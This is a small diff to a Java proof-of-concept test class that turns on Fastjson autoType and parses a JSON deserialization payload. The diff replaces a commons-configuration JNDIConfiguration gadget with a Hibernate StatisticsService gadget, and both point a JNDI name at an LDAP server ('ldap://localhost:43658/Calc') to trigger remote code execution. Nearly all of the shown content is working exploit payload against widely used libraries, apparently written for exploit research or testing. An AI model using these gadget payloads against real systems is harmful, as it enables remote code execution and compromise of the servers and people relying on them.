@@ -24,7 +24,7 @@ public class TestPoc {
     ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
 
 //    String payload = "{\"@\\u0074ype\":\"org.apache.commons.configuration.JNDIConfiguration\",\"jndiLocation\":\"ldap://localhost:43658/Calc\"}";//ldap方式
-    String payload = "{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"jndiLocation\":\"ldap://localhost:43658/Calc\"}";//ldap方式
+    String payload = "{\"@type\":\"org.hibernate.jmx.StatisticsService\",\"sessionFactoryJNDIName\":\"ldap://localhost:43658/Calc\"}";//ldap方式
     JSON.parse(payload);
   }
 }
